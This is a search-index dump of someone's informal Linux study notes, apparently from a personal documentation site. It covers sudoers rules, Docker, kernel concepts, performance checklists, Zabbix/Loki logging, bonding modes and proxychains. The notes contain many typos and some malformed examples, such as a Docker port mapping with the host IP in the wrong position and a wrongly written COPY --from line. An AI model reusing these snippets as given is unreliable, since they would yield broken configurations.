</ul> </li> </ul> <p>Edit a Different Sudoers File <pre><code>visudo -f /etc/sudoers.d/user_name\n</code></pre></p>"},{"location":"docs/Linux/sudo/#sudoers-configuration-cheat-sheet","title":"Sudoers Configuration Cheat Sheet","text":""},{"location":"docs/Linux/sudo/#1-basic-syntax","title":"1\ufe0f\u20e3 Basic Syntax","text":"<p>A <code>sudoers</code> rule follows this general format:</p> <pre><code>USER HOST = (RUNAS) COMMANDS\n</code></pre>"},{"location":"docs/Linux/sudo/#breakdown","title":"Breakdown:","text":"<ul> <li><code>USER</code> \u2192 The username that gets sudo access.</li> <li><code>HOST</code> \u2192 The system where the rule applies (usually <code>ALL</code>).</li> <li><code>(RUNAS)</code> \u2192 The user the command is executed as (<code>ALL</code> means any user).</li> <li><code>COMMANDS</code> \u2192 The allowed commands.</li> </ul>"},{"location":"docs/Linux/sudo/#example","title":"Example:","text":"<p><pre><code>alice ALL=(ALL) /usr/bin/apt update, !/usr/bin/apt upgrade\n</code></pre> \u2705 Alice can run <code>apt update</code> but not <code>apt upgrade</code>.</p>"},{"location":"docs/Linux/sudo/#2-aliases-in-sudoers","title":"2\ufe0f\u20e3 Aliases in Sudoers","text":"<p>Aliases group multiple users, commands, hosts, or run-as users for cleaner configuration.</p>"},{"location":"docs/Linux/sudo/#syntax","title":"Syntax:","text":"<pre><code>ALIAS_TYPE NAME = item1, item2, item3\n</code></pre>"},{"location":"docs/Linux/sudo/#types-of-aliases","title":"Types of Aliases:","text":"Alias Type Description Example <code>User_Alias</code> Groups multiple users <code>User_Alias ADMINS = alice, bob, charlie</code> <code>Runas_Alias</code> Groups users that commands can be executed as <code>Runas_Alias WEBUSERS = www-data, nginx</code> <code>Host_Alias</code> Groups multiple hosts <code>Host_Alias WEBSERVERS = web1, web2</code> <code>Cmnd_Alias</code> Groups multiple commands <code>Cmnd_Alias RESTART = /bin/systemctl restart nginx, /bin/systemctl restart apache2</code>"},{"location":"docs/Linux/sudo/#example-using-aliases","title":"Example Using Aliases:","text":"<p><pre><code>User_Alias ADMINS = alice, bob\nCmnd_Alias SYSTEM_CMDS = /sbin/shutdown, /sbin/reboot\n\nADMINS ALL=(ALL) NOPASSWD: SYSTEM_CMDS\n</code></pre> \u2705 Alice and Bob can shutdown and reboot the system without a password.</p>"},{"location":"docs/Linux/sudo/#3-granting-sudo-to-groups","title":"3\ufe0f\u20e3 Granting sudo to Groups","text":"<p>Instead of defining individual users, you can apply sudo rules to a Linux group.</p>"},{"location":"docs/Linux/sudo/#syntax_1","title":"Syntax:","text":"<pre><code>%groupname ALL=(ALL) ALL\n</code></pre>"},{"location":"docs/Linux/sudo/#example_1","title":"Example:","text":"<p><pre><code>%sysadmins ALL=(ALL) ALL\n</code></pre> \u2705 All users in the <code>sysadmins</code> group have full sudo access.</p>"},{"location":"docs/Linux/sudo/#4-using-user-id-uid-instead-of-names","title":"4\ufe0f\u20e3 Using User ID (UID) Instead of Names","text":"<p>You can define sudo access based on user IDs (UIDs) instead of usernames.</p>"},{"location":"docs/Linux/sudo/#syntax_2","title":"Syntax:","text":"<pre><code>#UID ALL=(ALL) COMMANDS\n</code></pre>"},{"location":"docs/Linux/sudo/#example_2","title":"Example:","text":"<p><pre><code>#1001 ALL=(ALL) /usr/bin/passwd\n</code></pre> \u2705 The user with UID 1001 can run <code>passwd</code> with sudo.</p>"},{"location":"docs/Linux/sudo/#5-restricting-sudo-based-on-time-environment","title":"5\ufe0f\u20e3 Restricting sudo Based on Time &amp; Environment","text":""},{"location":"docs/Linux/sudo/#setting-a-timeout-for-sudo-sessions","title":"Setting a Timeout for sudo Sessions","text":"<pre><code>Defaults timestamp_timeout=5  # Requires password after 5 minutes\n</code></pre>"},{"location":"docs/Linux/sudo/#logging-all-sudo-commands","title":"Logging All sudo Commands","text":"<pre><code>Defaults logfile=\"/var/log/sudo.log\"\n</code></pre>"},{"location":"docs/Linux/sudo/#restricting-sudo-to-certain-hours-using-pam-timeconf","title":"Restricting sudo to Certain Hours (Using PAM time.conf)","text":"<pre><code>sudo;*;bob;!Al1000-1800  # Bob can only use sudo outside 10AM-6PM\n</code></pre>"},{"location":"docs/Linux/sudo/#6-denying-sudo-access","title":"6\ufe0f\u20e3 Denying sudo Access","text":"<p>To completely prevent a user from using sudo, use: <pre><code>bob ALL=(ALL) !ALL\n</code></pre> \u2705 Bob cannot use <code>sudo</code> for any command.</p>"},{"location":"docs/Linux/sudo/#7-allowing-only-specific-commands","title":"7\ufe0f\u20e3 Allowing Only Specific Commands","text":""},{"location":"docs/Linux/sudo/#example-allow-only-rsync-to-a-specific-host","title":"Example: Allow Only <code>rsync</code> to a Specific Host","text":"<p><pre><code>backupuser ALL=(ALL) NOPASSWD: /usr/bin/rsync -avz * backup.example.com:/backups\n</code></pre> \u2705 <code>backupuser</code> can only sync files to <code>backup.example.com</code>.</p>"},{"location":"docs/Linux/sudo/#8-preventing-certain-dangerous-commands","title":"8\ufe0f\u20e3 Preventing Certain Dangerous Commands","text":""},{"location":"docs/Linux/sudo/#example-allow-everything-except-rm-rf-and-shutdown","title":"Example: Allow Everything EXCEPT <code>rm -rf</code> and <code>shutdown</code>","text":"<p><pre><code>devops ALL=(ALL) ALL, !/bin/rm -rf, !/sbin/shutdown\n</code></pre> \u2705 <code>devops</code> can run anything except <code>rm -rf</code> and <code>shutdown</code>.</p>"},{"location":"docs/Linux/tar/","title":"alt-name ### Tape archive **It refers to the times where data where","text":"<p>stored on the tape**</p> <p>The tar command creates a single file from many files which is then referred to as an archive, tar file, or tarball.</p> <p>[!quote] Archive vs Compress</p>"},{"location":"docs/Linux/top/","title":"top","text":""},{"location":"docs/Linux/top/#top","title":"Top","text":"<p>Top displays acitve procces with th refrexh rate of 3s</p> <p>[!quote] nice</p>"},{"location":"docs/Linux/umask/","title":"umask","text":"<ul> <li>The default value of umask is set in <code>/etc/login.defs</code></li> <li>This with touch command creates a file with different perrmisons<ul> <li>by defult this is set to 0 2 2</li> </ul> </li> </ul> <p>Tip To change the umask value for a user, edit the file /home/username/.profile</p> <p>Octal value : Permission 0 : read, write and execute 1 : read and write 2 : read and execute 3 : read only 4 : write and execute 5 : write only 6 : execute only 7 : no permissions</p>"},{"location":"docs/Linux/Docker/docker/","title":"docker","text":"<p>runing as host</p> <pre><code>docker run --rm -ti --network host -v $PWD/work:/work parrotsec/security\n</code></pre> <p>Get rid of all running containers</p> <pre><code>docker rm -f $(docker ps -a -q)\n</code></pre>"},{"location":"docs/Linux/Docker/docker/#entrypoint-vs-cmd","title":"ENTRYPOINT vs CMD","text":"<ul> <li>Use <code>ENTRYPOINT</code> to define the main command that should always run.</li> <li>Use <code>CMD</code> to provide default arguments or commands that can be     overridden.</li> </ul> <pre><code>#Example\nFROM ubuntu:latest\n\n# Set the entry point\nENTRYPOINT [\"python3\", \"app.py\"]\n\n# Set default arguments\nCMD [\"--help\"]\n</code></pre>"},{"location":"docs/Linux/Docker/docker/#docker-logging","title":"Docker logging","text":"<ul> <li>Basic options</li> <li>\u2013tail</li> <li>\u2013head</li> <li>\u2013since</li> <li>\u2013until</li> <li>\u2013follow</li> </ul>"},{"location":"docs/Linux/Docker/docker/#checking-the-driver","title":"Checking the driver","text":"<p>This logs are stored in /var/lib/docker/containers/ <ul> <li>U can check them by</li> </ul> <pre><code>docker info --format '{{.LoggingDriver}}'\n</code></pre> <ul> <li>In a particular container</li> </ul> <pre><code>docker inspect -f '{{.HostConfig.LogConfig.Type}}' &lt;container_id&gt;\n</code></pre> <p>[!Note]- Login drivers list  Docs</p>"},{"location":"docs/Linux/Docker/docker/#creating-a-driver","title":"Creating a driver","text":"<p>[!example] Example file </p>"},{"location":"docs/Linux/Docker/docker/#changing-the-driver","title":"Changing the driver","text":"<ul> <li>\u2013log-driver</li> </ul> <pre><code>docker run --log-driver local --log-opt max-size: 50m -p 80:80/tcp -d \"betterstackcommunity/nginx-helloworld:latest\"\n</code></pre> <p>[!bug] Log rotation isn\u2019t set by default in json driver</p>"},{"location":"docs/Linux/Docker/docker/#docker-network","title":"Docker Network","text":"<p>[[Docker Netwroks.canvas|Docker Netwroks]]</p>"},{"location":"docs/Linux/Docker/docker/#exposing-vs-publishing-ports","title":"Exposing vs publishing ports","text":"<ul> <li>Exposing a port<ul> <li>letting others know on which port the container is going to be     listening on<ul> <li>This is for communicating with other containers, not     with the outside world.</li> </ul> </li> </ul> </li> </ul> <pre><code>docker container run \\\n    --expose 80 \\\n    --expose 90 \\\n    --expose 70/udp \\\n    -d --name port-expose busybox:latest sleep 1d\n</code></pre> <ul> <li>Publishing ports<ul> <li>Mapping the ports of the container with the host</li> </ul> </li> </ul> <pre><code>-p [optional_host_ip]:[host_port]:[container_port]/[optional_protocol]\n</code></pre> <pre><code>docker container run --rm --name nginx \\\n    -p 80:127.0.0.1:8081/tcp -d nginx\n</code></pre>"},{"location":"docs/Linux/Docker/docker/#multi-stage-docker-images","title":"Multi-stage docker images","text":""},{"location":"docs/Linux/Docker/docker/#attach-to-the-container","title":"Attach to the container","text":"<pre><code>docker exec -it (container id ) /bin/sh(or bash if installed)\n</code></pre>"},{"location":"docs/Linux/Docker/docker/#docker-compose","title":"Docker compose","text":"<p>This file can be either yaml or json</p> <ul> <li>version (need to checuotu the last complibit version)<ul> <li>It has to be a string!</li> </ul> </li> <li>servives are whats beeing run<ul> <li></li> <li>u can also define ports with ports ## commands</li> </ul> </li> <li>To start the server use docker-compose up</li> <li>To end the app type **docker compose down **</li> <li>Auto-reload </li> </ul> <ul> <li>cloud-int</li> <li>[podman]({{\\&lt; ref \u201cposts/Linux/Docker/podman.md\u201d&gt;}})</li> </ul>"},{"location":"docs/Linux/Docker/multi_stage_image/","title":"Multi-stage docker images","text":"<p>U can minifie the size of the app by reducing the conatiner to a certain stage</p> <pre><code># Stage 1: Build Environment\nFROM builder-image AS build-stage \n# Install build tools (e.g., Maven, Gradle)\n# Copy source code\n# Build commands (e.g., compile, package)\n\n# Stage 2: Runtime environment\nFROM runtime-image AS final #this is ussualy always called final  \n#  Copy application artifacts from the build stage (e.g., JAR file)\nCOPY --from: build-stage /path/in/build/stage /path/to/place/in/final/stage\n# Define runtime configuration (e.g., CMD, ENTRYPOINT)\n</code></pre>"},{"location":"docs/Linux/Docker/multi_stage_image/#targeting-build-stage","title":"Targeting build stage","text":"<pre><code>docker build --target build -t my-app:build .\n</code></pre> <ul> <li>docker</li> </ul>"},{"location":"docs/Linux/Docker/podman/","title":"podman","text":""},{"location":"docs/Linux/Docker/podman/#creating-a-systemd-service","title":"Creating a systemd service","text":"<p>!!! Outdated way !!!</p> <p><pre><code>#/home/pratham/container-chitragupta-db.service\npodman generate systemd --new --name chitragupta-db -f\n</code></pre> * New way  quadlet</p>"},{"location":"docs/Linux/Docker/podman/#creating-a-systemd-service-with-ansible","title":"Creating a systemd service with ansible","text":"<p>**Systemd unit files for postgres container must exist!!!</p> <pre><code>    - name: Create systemd user service\n      containers.podman.podman_generate_systemd:\n        name: \"{{ container_name }}\"\n        dest: ~/.config/systemd/user/\n</code></pre>"},{"location":"docs/Linux/Kernel/Cpu/","title":"Cpu","text":""},{"location":"docs/Linux/Kernel/Cpu/#central-processing-unit","title":"Central Processing Unit","text":"<p>The brain of the computer - The CPU is responsible for executing instructions of computer programs and controlling the other components of the computer system. - It performs arithmetic and logical operations on data, retrieves and stores data in memory, and communicates with other components of the computer (such as the memory, input/output devices, and secondary storage devices)</p>"},{"location":"docs/Linux/Kernel/Cpu/#cpu-addresing","title":"CPU addresing","text":"<p>set in bits - Word how big of a chunk of memory cpu can take and operate on - Thats why Therese the x64 architecture - Coputer can operate only on 64 bits at a time</p> <p>[!note] x32 can only operate on 4Gigs of memory \u2026 Now u can operate on 20 exabyte</p>"},{"location":"docs/Linux/Kernel/Cpu/#cpu-times-subdevisions","title":"Cpu times (Subdevisions)","text":"<p>User - Amount of time CPU was busy executing code in user space</p> <p>System - amount of time the CPU was busy executing code [[Kernel|Kernel space]].</p> <p>Idle(for the whole system only) - amount of time the CPU was not busy - amount of time it executed the System Idle process. - Idle time actually measures unused CPU capacity.</p> <p>Steal(for the whole system only) - on virtualized hardware, is the amount of time the operating system wanted to execute, but was not allowed to by the hypervisor. - This can happen if the physical hardware runs multiple guest operating system and the hypervisor chose to allocate a CPU time slot to another one.</p> <p>[[mpstat]]</p>"},{"location":"docs/Linux/Kernel/Cpu/#cpu-process-priorities","title":"CPU process priorities","text":"<p> -  \u2014 Compitaltion process garbage_collector_c</p>"},{"location":"docs/Linux/Kernel/Kernel/","title":"Kernel","text":""},{"location":"docs/Linux/Kernel/Kernel/#baisisc-info-of-the-kernel","title":"Baisisc info of the kernel","text":"<p>uname -a/-r &gt;[!tip]- Result &gt;</p>"},{"location":"docs/Linux/Kernel/Kernel/#main-tasks","title":"Main tasks","text":"<ul> <li> <p>Spliting memory into subdevisons</p> </li> <li> <p>processes_kernel</p> </li> <li> <p>The kernel is responsible for determining which processes are     allowed to use the CPU.</p> </li> <li> <p>Memory</p> <ul> <li> <p>The kernel needs to keep track of all memory\u2014what is currently     allocated to a particular process,</p> <p>what might be shared between processes, and what is free.</p> </li> </ul> </li> <li> <p>Device drivers</p> <ul> <li> <p>The kernel acts as an interface between hardware (such as a     disk) and processes. It\u2019s</p> <p>usually the kernel\u2019s job to operate the hardware.</p> </li> </ul> </li> <li> <p>System calls and support</p> <ul> <li>processes_kernel     normally use system calls to communicate with the kernel.</li> </ul> </li> </ul>"},{"location":"docs/Linux/Kernel/Kernel/#see-the-previous-verison-of-the-kernel-that-are-on-the-machine","title":"See the previous verison of the kernel that are on the machine","text":"<p>Rembeber to backup the Kernel</p> <pre><code>ls -l /boot/vm*\n</code></pre> <pre><code>apt list --installed | grep linux-image\n</code></pre>"},{"location":"docs/Linux/Kernel/Kernel/#kernel-options","title":"Kernel Options","text":"<p>U have to write to etc/sysctl.conf sysctl</p>"},{"location":"docs/Linux/Kernel/Kernel/#boot","title":"Boot","text":"<ul> <li>Boot procces</li> <li>rc scripts</li> <li>cgroups</li> </ul>"},{"location":"docs/Linux/Kernel/Kernel_modules/","title":"Kernel modules","text":""},{"location":"docs/Linux/Kernel/Kernel_modules/#kernel-modules","title":"Kernel modules","text":"<ul> <li>modeprobe<ul> <li> <p>Automatically loads dependencies and makes loading and removing     kernel modules less risky</p> <ul> <li> <p>-a add module</p> </li> <li> <ul> <li>r remove         -   The most modern and best approach</li> </ul> </li> <li>lsmod<ul> <li>list all available kernel nodules and information of their size</li> </ul> </li> <li>modeinfo<ul> <li>IT gives a summarize of the module &gt;[!example]- &gt;</li> </ul> </li> <li>insmode<ul> <li>load or or insert a module</li> </ul> </li> <li>rmmod<ul> <li>remove the mode(Be carfull with this!)</li> </ul> </li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/Linux/Kernel/Kernel_modules/#managing-kernel-module-parameters","title":"Managing KErnel Module Parameters","text":"<p>Example loading a  <code>cdrom module</code> with a debug paramater  <pre><code>modprobe cdrom debug=1.\n</code></pre></p>"},{"location":"docs/Linux/Kernel/cache/","title":"Casche","text":"<p>Small and fast temporarly storage area located near Cpu for efficient and near-instant data retrival</p> <ul> <li>It carries the freqently used data<ul> <li>It uses S-ram</li> </ul> </li> <li>There are 3 casche levels(closesness and acessability)</li> <li>L1 (priamary casche)<ul> <li>fast</li> <li>small</li> <li>emebeded in Cpu</li> </ul> </li> <li>L2<ol> <li>holds more then L1</li> <li>can be emebeded or run on a seperate chip</li> </ol> </li> <li>L3 Specialiazed memory design to improve the performance of L1     and L2 casches</li> </ul> <p>Redis Etag</p>"},{"location":"docs/Linux/Kernel/context_switch_kernel/","title":"context switch_kernel","text":""},{"location":"docs/Linux/Kernel/context_switch_kernel/#contex-switch","title":"Contex Switch","text":"<ul> <li>The act of one proces giving up control of the CPU to another     process is called a context switch<ul> <li>Each pieace of time calllaed a time slice<ul> <li>gives a process enough time for significat computation</li> </ul> </li> </ul> </li> </ul> <p>[!quote] threads</p>"},{"location":"docs/Linux/Kernel/dmesg_command/","title":"dmesg command","text":"<p>Shows Kernel Ring buffer form when the systme has started</p> <ul> <li>Display the messages generated by the kernel and other system     processes_kernel during     bootup or while the system is running<ul> <li>This information can be helpful in troubleshooting system issues     or investigating hardware or software errors.</li> </ul> </li> </ul> <p>[!quote] Kernel</p>"},{"location":"docs/Linux/Kernel/garbage_collector_c/","title":"garbage collector c","text":""},{"location":"docs/Linux/Kernel/garbage_collector_c/#region-based-memory-allocator","title":"Region-based memory allocator","text":"<ul> <li>**U alllcated a big chunk of memeory and every time the more memory     is requaierd u get subchanks of that **<ul> <li>At the end of the interation (ex. Training loop) u swipe all     the memory</li> </ul> </li> <li>In the modern coputers u can allocate as big memory space as u     want since they do not allcoate memory befor it being     used &gt;[!example]- &gt;</li> </ul> <p>[!quote] Areana Allocater</p>"},{"location":"docs/Linux/Kernel/handle/","title":"handle","text":"<p>Generic unit of identification Used to identyfuie the process</p> <p>[!quote] processes_kernel</p>"},{"location":"docs/Linux/Kernel/performens_tools/BPF/","title":"Berkely Packet Filter","text":"<p>Run mini programs on the kernel application events</p> <p>Similar to java script running on click or on scroll on top of the  main runtime </p> <p>Run mini monitorin program on system and appilciation events such as disk io </p> <ul> <li> <p><code>Tracing</code> Event based recording</p> <ul> <li>tracing duming and snoopin are baicly the same </li> </ul> </li> <li> <p><code>Sampling/Profiling</code>  messuer much out of large set of daayt </p> </li> <li></li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/","title":"Profiling","text":"<p>Use tools that perform Sampling</p>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#sampling-cpu","title":"Sampling CPU","text":"<ul> <li>taking timed-interval samples of the on- CPU code paths.</li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#flame-graphs","title":"Flame graphs","text":"<ul> <li>Flame graphs visualize function calls and their CPU usage.<ul> <li>They show which functions were called, their execution order, and how much CPU time they consumed.</li> <li>The wider a function block is, the more CPU time it took.</li> </ul> </li> <li>Syscalls appear in the stack, revealing how the program interacts with the operating system.</li> <li>It also show which function called which function in the stack <p>The more red the more CPU CONSUMPTION  </p> </li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#tracing","title":"Tracing","text":"<p><code>Event Based Recording</code> (<code>tracing</code> <code>dumping</code> and <code>snooping</code> are basically the same)</p> <ul> <li><code>execscooop</code> looks for small programs running in the background<ul> <li>Run mini programs on the kernel application events</li> <li>Similar to java script running on click or on scroll on top of the main runtime </li> </ul> </li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#static-instrumentation","title":"Static Instrumentation","text":"<p>marking the functions inside the code so that later u can see how often they are used and their performance </p>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#dynamic-instrumentation","title":"Dynamic Instrumentation","text":"<p>You to insert measurement points while it's running Similar to debugger setting the break points...</p>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#linux-60-second-performance-analysis-checklist","title":"Linux 60-Second Performance Analysis Checklist","text":"<p>This is a Linux tool-based checklist that can be executed in the first 60 seconds of a performance issue investigation</p> Tool &amp; Command Check <code>dmesg -T | tail</code> Kernel errors, including OOM (Out of Memory) events. <code>vmstat -SM 12</code> System-wide stats: run queue length, swapping, overall CPU usage. <code>mpstat -P ALL 1</code> Per-CPU balance: a single busy CPU may indicate poor thread scaling. <code>pidstat 1</code> Per-process CPU usage: identify unexpected CPU consumers, user/system CPU time per process. <code>iostat -sxz 2</code> Disk I/O stats: IOPS, throughput, average wait time, percent busy. <code>sar -n DEV 1</code> Network device I/O: packets and throughput. <code>sar -n TCP,ETCP 1</code> TCP statistics: connection rates, retransmits. <code>top</code> Check system overview: CPU, memory, and process usage."},{"location":"docs/Linux/Kernel/performens_tools/metrics/#io-utilization","title":"Io utilization","text":"<p>Some components  might work better with the 102% utilization</p>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#disks-and-storage-arrays","title":"Disks and storage arrays","text":"<ul> <li><code>Disk</code><ul> <li>A disk that is 100% busy may also be able to accept and process more work<ul> <li>Example by buffering writes in the on  disk cache to be completed later.</li> </ul> </li> </ul> </li> <li><code>Storage arrays</code> </li> <li>frequently run at 100% utilization because some disk is busy 100% of the</li> <li>time, but the array has plenty of idle disks and can accept more work</li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#cache","title":"Cache","text":""},{"location":"docs/Linux/Kernel/performens_tools/metrics/#hit-or-miss-ration","title":"Hit or miss ration","text":"<p>The higher the better  hit ratio = hits / (hits + misses)</p> <ul> <li><code>Hits</code> The number of times a requested item is found in the cache.</li> <li><code>Misses</code> The number of times the requested item is not in the cache and must be retrieved from a slower source.</li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#hot-cold-and-warm-caches","title":"Hot, Cold, and Warm Caches","text":"<p><code>Warmth</code> activity that improves the <code>hit ratio</code></p> <ul> <li><code>Cold</code> is empty or with unwanted  data the <code>hit ratio</code>is 0 (or near zero if it begins to warm up)</li> <li><code>Warm</code> populated with useful data but not enoughi <code>hit ratio</code>to be consider  <code>hot</code></li> <li><code>Hot</code> has commonly requested data and has high <code>hit ration</code> </li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#operating-systems","title":"Operating Systems","text":""},{"location":"docs/Linux/Kernel/performens_tools/metrics/#traping","title":"Traping","text":"<p>It's basically kernel managing  his little child (user space)</p> <ul> <li><code>SystemCalls</code> (asking for help)<ul> <li>program asks the operating system for help, like reading a file. </li> </ul> </li> <li><code>Error&amp;Exeption</code> (making mistakes/divide-by-zero trap)<ul> <li>when your program tries something impossible, the CPU stops it and calls the OS to handle the error. </li> </ul> </li> <li><code>Page Fault</code> <ul> <li>when your program needs memory that is\u2019t ready, the computer stops, loads the memory, and then continues.</li> </ul> </li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#interrupts-in-general","title":"Interrupts in general","text":"<p>It saves the state of the process , and then run an interrupt service routine (ISR) to resolve the issue.</p>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#interrupt-masking","title":"Interrupt masking","text":"<ul> <li><code>Interrupt Masking</code> = \"Don't talk to me right now!\"</li> <li>Process is doing something important and can't be stopped </li> <li><code>None-Maskable interutps</code> (NMI) </li> <li>Basically  that bypassed process that can't be stopped </li> <li>Linux can use an Intelligent Platform Management Interface <code>(IPMI)</code><ul> <li>watchdog timer that checks if the kernel appears to have locked up based on a lack of interrupts during a period of time. If so, the watchdog can issue an NMI interrupt to reboot the system </li> <li>Linux also has a software NMI watchdog for detecting lockups </li> </ul> </li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#hardware-interrupt-type-of-trap","title":"Hardware interrupt (type of trap)","text":"<ul> <li>A signal sent by physical devices to the kernel (usually to request servicing of I/O.)</li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#memory-paging-vs-swapping","title":"Memory paging vs swapping","text":"<ul> <li>Paging  is free small parts of the memory from the programms to sustain memory consumiton</li> <li>Swapping is cleaning the entire program memory so the other can use it <ul> <li>very slow and inefficient</li> </ul> </li> </ul>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#vfs","title":"Vfs","text":"<p>(virtual filesystem) It determines for u which disk and file system is responsible for the particiular disk  * U don't  have to worry about using the particular dirver      *  it's a layer of abstraction </p>"},{"location":"docs/Linux/Kernel/performens_tools/metrics/#tracepoints","title":"Tracepoints","text":"<p>Tracepoints are like execution checkpoints/sesnosrs in the Linux kernel. * They send debug information when a certian syscall is triggered by the   proccess (example file opening)     *  The list of avaiable tracepoints is stored int <code>/sys/kernel/debug/tracing/events/</code></p>"},{"location":"docs/Linux/Linux_commands/Baisic_Linux_commands/","title":"Baisic Linux commands","text":"<p>Ls -l to get list</p> <p>ls -al list hidden stuff</p> pwd (print working directory) tells u were u are cd.. jump back one directory <p>touch (file name) create a file every space creates aditional files</p> echo &gt; stuff to add and somthing to the file mkdir make a new directory cp file and then the path copy a file mv file and then the path to move a file rm to remove a file rm dir to remove directory rm -r* *(remove directory with files)** name of directory ln -s create a link to a file <p>whoami to see who are u</p> <p>useradd nick to create new user</p> <p>su to switch users</p> <p>exit direct back to the admin</p> <p>sudo apt update to update repostiories</p> <p>man* expleins what does the command does</p> <p>what is faster man</p> <p>wchih to see wher the one file is</p> <p>where is to seee where the file is</p> w get to get smth from the internet curl &gt; file to direct to get smth from the internet find (dir) name to find the file chmod+x to make file execute <p>ifconfig to see ip adress</p> <p>ip addres</p> <p>ip adress | grep and the specyfic parameter to see only one parameter</p> <p>ping name of the file to see wether something is up</p> <p>Neofetch to see system properties</p> <p>free how much space do u have</p> <p>df how much disc space do u have</p> <p>df -h to be more specyfic</p> <p>ps to see the proceses on usere computer</p> <p>ps -aux more detailed version</p> <p>top to see processes</p> <p>htop prettier way</p> kill to stop the proceses (u have to know process id ) pkill -f u dont have to know process id <p>history to see what u did</p> <p>sudo rebbot sudo shutdown sudo shutdown -h now</p>"},{"location":"docs/Linux/Logging/Loki/","title":"Loki","text":"<p>Project - Accepts all formats but requires u to index a specific fields that you would like to monitor - </p>","tags":["logging"]},{"location":"docs/Linux/Logging/Loki/#deployment","title":"Deployment","text":"<ul> <li>Loki configuration file</li> <li>Docker img</li> <li>collector(to send the logs to the Loki)</li> </ul>","tags":["logging"]},{"location":"docs/Linux/Logging/Loki/#data-storage-types","title":"Data storage types","text":"<ul> <li>index Storing here <code>log levels</code> <code>source</code><ul> <li>faster rate</li> </ul> </li> <li>Chunk<ul> <li>Container for the</li> </ul> </li> </ul> <p>journalctl</p>","tags":["logging"]},{"location":"docs/Linux/Logging/zabbix/","title":"zabbix","text":"","tags":["logging"]},{"location":"docs/Linux/Logging/zabbix/#zabbix-dashboard-features","title":"Zabbix Dashboard features","text":"","tags":["logging"]},{"location":"docs/Linux/Logging/zabbix/#dashboard-widgets","title":"Dashboard widgets","text":"","tags":["logging"]},{"location":"docs/Linux/Logging/zabbix/#action-log","title":"Action log","text":"<p>Docs When zabbix  does anything from the list it's called an action and it's stored  in the <code>action log</code></p> <ul> <li>Notification (mails, SMS messages, or other types of alerts)</li> <li>Remote commands (running scripts, restarting services)</li> <li>Automatic actions<ul> <li>if Zabbix has automatically scaled up resources, shut down a server, or triggered a backup process, these would be logged.</li> </ul> </li> <li>Manual actions (commands triggered by the zabbix interface)</li> </ul>","tags":["logging"]},{"location":"docs/Linux/Logging/zabbix/#default-discovery","title":"Default discovery","text":"<ul> <li>Shows <code>Active Network</code> Discovery Rules:<ul> <li>Network discovery rules are configurations that determine how a system identifies and interacts with devices on a network.<ul> <li>The number of rules currently in effect.</li> <li>Any alerts or notifications related to the rules.</li> <li>Performance metrics or statistics related to network discovery. docs</li> </ul> </li> </ul> </li> </ul>","tags":["logging"]},{"location":"docs/Linux/Logging/zabbix/#honeycomb","title":"Honeycomb","text":"<p>The honeycomb widget offers a dynamic overview of the monitored network infrastructure and resources, where host groups, such as virtual machines and network devices, along with their respective items, are visually represented as interactive hexagonal cells. Docs </p>","tags":["logging"]},{"location":"docs/Linux/Network_manipulation/bonding/","title":"Network Bonding Modes","text":""},{"location":"docs/Linux/Network_manipulation/bonding/#1-round-robin-mode-0","title":"1. Round Robin (Mode 0)","text":"<ul> <li>Description: Data packets are sent sequentially across all interfaces, distributing the load evenly.</li> <li>Features: </li> <li>Load balancing</li> <li>Fault tolerance</li> <li>Requirements: Switch support.</li> </ul>"},{"location":"docs/Linux/Network_manipulation/bonding/#2-active-backup-mode-1","title":"2. Active Backup (Mode 1)","text":"<ul> <li>Description: Only one interface is active at a time. If the active interface fails, another takes over.</li> <li>Features: </li> <li>Fault tolerance</li> <li>Requirements: No special switch configuration needed.</li> </ul>"},{"location":"docs/Linux/Network_manipulation/bonding/#3-xor-mode-2","title":"3. XOR (Mode 2)","text":"<ul> <li>Description: Data packets are distributed based on the result of a XOR operation on the source and destination MAC addresses.</li> <li>Features: </li> <li>Load balancing</li> <li>Fault tolerance</li> </ul>"},{"location":"docs/Linux/Network_manipulation/bonding/#4-broadcast-mode-3","title":"4. Broadcast (Mode 3)","text":"<ul> <li>Description: All data packets are transmitted on all interfaces.</li> <li>Features: </li> <li>Fault tolerance</li> <li>Note: Does not provide load balancing.</li> </ul>"},{"location":"docs/Linux/Network_manipulation/bonding/#5-ieee-8023ad-mode-4","title":"5. IEEE 802.3ad (Mode 4)","text":"<ul> <li>Also Known As: Dynamic Link Aggregation.</li> <li>Features: </li> <li>Load balancing</li> <li>Fault tolerance</li> <li>Requirements: Switch support.</li> </ul>"},{"location":"docs/Linux/Network_manipulation/bonding/#6-adaptive-transmit-load-balancing-mode-5","title":"6. Adaptive Transmit Load Balancing (Mode 5)","text":"<ul> <li>Description: Distributes outgoing traffic based on the load on each interface. Incoming traffic is received by the current active interface.</li> <li>Features: </li> <li>Load balancing</li> <li>Fault tolerance</li> <li>Requirements: No special switch support needed.</li> </ul>"},{"location":"docs/Linux/Network_manipulation/bonding/#7-adaptive-load-balancing-mode-6","title":"7. Adaptive Load Balancing (Mode 6)","text":"<ul> <li>Description: Similar to Mode 5 but also balances incoming traffic through ARP negotiation.</li> <li>Features: </li> <li>Load balancing</li> <li>Fault tolerance</li> <li>Requirements: No special switch support needed.</li> </ul>"},{"location":"docs/Linux/Network_manipulation/proxy/","title":"proxy","text":""},{"location":"docs/Linux/Network_manipulation/proxy/#proxies","title":"Proxies","text":"<p>To confighure proxies use etc/proxychains.conf &gt;[!example] &gt;- If you\u2019re not adding your own proxies and want to use Tor, leave this as it is. If you are not using Tor, you\u2019ll need to comment out this line </p> <p>To make it hapen u have to type proxychains browser domain ### Random chainging In order to change the proxy server randomly u have to set chain to the dynamic chain adn specyfie the len of the chain &gt;[!example]- 